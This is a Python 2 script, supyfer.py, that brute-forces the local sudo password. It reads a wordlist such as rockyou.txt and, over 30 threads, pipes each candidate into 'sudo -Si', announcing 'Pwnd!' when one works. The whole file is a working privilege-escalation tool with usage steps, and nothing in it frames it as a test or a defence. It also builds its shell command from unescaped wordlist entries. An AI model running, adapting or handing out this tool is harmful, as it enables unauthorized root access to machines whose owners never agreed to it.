# Author: Guilherme Tomishiyo (Based in a Python 3 version by Matej Ramuta)
# How to use this script:
# 1. You need to have a WORDLIST file, something like rockyou.txt
# 2. Make sure you have Python 2 installed.
# 3. Run the script like this: python supyfer.py /path/to/wordlist

import os
import sys
import threading


def test_password(password):
    """
    Tests password for sudo; discard the verbose text from the command.
    If successful, turns SIGNAL to false and returns 0.
    """
    global SIGNAL
    if SIGNAL:
        os_arg = "echo {}".format(password.strip()) + " | sudo -Si 2>/dev/null"
        result = os.system(os_arg)

        if result == "0" or result == 0:
            print ""
            print OKGREEN + "Pwnd! :) The password is: {}".format(password)
            SIGNAL = False
        else:
            pass


def start_threads(number_of_threads):
    """
    Start threads provided SIGNAL is true. Each thread runs test_password
    function with a password from the WORDLIST.
    """
    global WORDLIST
    threads = []
    testing_password = []

    for _ in range(number_of_threads):
        if WORDLIST:
            password = WORDLIST.pop(0)
            testing_password.append(password)
            threads.append(threading.Thread(target=test_password, \
                                            args=(password, )))

    print(testing_password)
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()


def main():
    try:
        wordfile = sys.argv[1]
    except IndexError:
        print "Usage: python supyfer.py <WORDLIST>"
        exit()

    print "Brute force sudo password with wordlist {}".format(wordfile)
    print ""

    with open(wordfile) as wordfile:
        for word in wordfile:
            WORDLIST.append(word.strip())

    print "Testing passwords:"
    while len(WORDLIST) > 0 and SIGNAL:
        if len(WORDLIST) >= NUMBER_THREADS:
            start_threads(NUMBER_THREADS)
        else:
            start_threads(len(WORDLIST))



if __name__ == '__main__':
    # --- GLOBALS --- #
    NUMBER_THREADS = 30
    SIGNAL = True # If this is true the threads keep running
    OKGREEN = '\033[92m' # Color code for successful attempt
    WORDLIST = []

    main()
